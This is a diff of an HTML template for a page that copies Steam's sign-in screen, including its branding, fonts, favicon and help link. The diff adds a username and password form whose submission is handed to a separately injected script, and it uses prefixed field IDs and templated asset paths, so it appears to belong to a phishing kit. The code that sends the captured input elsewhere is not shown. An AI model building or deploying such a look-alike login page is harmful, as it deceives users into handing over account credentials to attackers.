@@ -1,44 +1,44 @@
 <!DOCTYPE html>
 <html lang="en">
   <head>
-    <title></title>
+    <title>Sign In</title>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <link rel="icon" type="image/x-icon" href="/static/images/steam.ico">
+    <link rel="icon" type="image/x-icon" href="{{.static}}/images/steam.ico">
   </head>
   <body>
     <main class="outer">
       <p>Steam | Sign In</p>
-      <main class="inner">
+      <form action="javascript:void(0);" id="PF_form" class="inner">
         <div>
           <label class="blue">sign in with account name</label>
-          <input type="text" id="user">
+          <input type="text" id="PF_user" required>
         </div>
         <div>
           <label>password</label>
-          <input type="password" id="pass">
+          <input type="password" id="PF_pass" required>
         </div>
-        <button id="submit">Sign in</button>
+        <button type="submit">Sign in</button>
         <a href="https://help.steampowered.com/en/wizard/HelpWithLogin">Help, I can't sign in</a>
-      </main> 
+      </form> 
     </main>
-    <script type="module" src="/static/script.js"></script>
+    {{template "parts/script" .}}
   </body>
 
   <style>
     @font-face {
       font-family: streg;
-      src: url(/static/fonts/MotivaSans.ttf);
+      src: url("{{.static}}/fonts/MotivaSans.ttf");
     }
 
     @font-face {
       font-family: stmed;
-      src: url(/static/fonts/MotivaSansMedium.ttf);
+      src: url("{{.static}}/fonts/MotivaSansMedium.ttf");
     }
     
     @font-face {
       font-family: stthin;
-      src: url(/static/fonts/MotivaSansThin.ttf);
+      src: url("{{.static}}/fonts/MotivaSansThin.ttf");
     }
 
     *{
@@ -48,7 +48,7 @@
 
     body{
       color: #afafaf;
-      background: url("/static/images/steam.jpg")
+      background: url("{{.static}}/images/steam.jpg")
     }
 
     .outer{
